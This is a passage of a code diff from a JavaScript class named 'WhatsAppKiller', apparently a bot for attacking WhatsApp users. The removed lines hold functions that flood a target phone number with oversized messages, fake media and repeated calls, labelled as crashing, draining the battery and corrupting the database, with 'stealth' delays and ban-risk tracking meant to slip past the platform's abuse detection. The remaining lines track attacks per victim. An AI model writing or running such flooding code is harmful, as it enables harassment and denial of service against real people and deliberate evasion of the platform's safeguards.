         }
-        return { success: attempts > 0, impact: 'Notification Overload (Stealth)', details: `${attempts} notifications sent` };
     }
 
-    async mediaFlood(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                const messages = [];
-                for (let i = 0; i < 2; i++) {
-                    messages.push(`📸 Media_${i}_${crypto.randomBytes(2500).toString('base64').substring(0, 250)}`);
-                }
-                await this.stealth.sendStealthBatch(this.sock, phone, messages, {
-                    delayBetween: this.stealth.getNaturalDelay('message') * 0.7,
-                    maxPerBatch: 2
-                });
-                attempts += 2;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 1.2);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Media Storage Full (Stealth)', details: `${attempts} media files sent` };
-    }
-
-    async callCrash(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                await this.stealth.makeStealthCall(this.sock, phone, {
-                    simulateTyping: true,
-                    randomDelay: true,
-                    trackRateLimit: true,
-                    callDuration: 1500 + Math.random() * 2000
-                });
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('call') * 0.5);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Call System Crashed (Stealth)', details: `${attempts} call crash attempts` };
-    }
-
-    async statusCrash(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                await this.sendWhatsAppMessage(phone, '📱 STATUS_' + 'A'.repeat(25000));
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Status System Crashed (Stealth)', details: `${attempts} status crash payloads` };
-    }
-
-    async databaseCorrupt(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                await this.sendWhatsAppMessage(phone, 'DB_CORRUPT_' + crypto.randomBytes(25000).toString('hex'));
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.8);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Database Corrupted (Stealth)', details: `${attempts} corruption payloads sent` };
-    }
-
-    async networkKill(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                await this.sendWhatsAppMessage(phone, '🔌 NETWORK_KILL_' + 'A'.repeat(25000));
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.7);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Network Connection Killed (Stealth)', details: `${attempts} network kill payloads` };
-    }
-
-    async batteryDrain(phone, duration) {
-        let attempts = 0;
-        const startTime = Date.now();
-        while (Date.now() - startTime < duration * 1000) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            
-            try {
-                await this.sendWhatsAppMessage(phone, '🔋 DRAIN_' + 'A'.repeat(25000));
-                attempts++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') * 0.6);
-            } catch (e) {
-                this.stealth.increaseBanRisk(phone, 0.5);
-            }
-        }
-        return { success: attempts > 0, impact: 'Battery Drained (Stealth)', details: `${attempts} drain payloads sent` };
-    }
-
-    // ==============================================
+    // ==========================================
     // ATTACK TRACKING
-    // ==============================================
+    // ==========================================
     trackAttack(phone, type) {
         if (!this.attackStats.has(phone)) {
             this.attackStats.set(phone, { killwa: 0, lastAttack: null });
@@ -649,11 +743,15 @@ class WhatsAppKiller {
     getAttackStats(phone) {
         return this.attackStats.get(phone) || { killwa: 0, lastAttack: null };
     }
+
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
 }
 
-// ==============================================
+// ==========================================
 // STOP COMMAND
-// ==============================================
+// ==========================================
 class WhatsAppKillerStop {
     constructor(killer) {
         this.killer = killer;
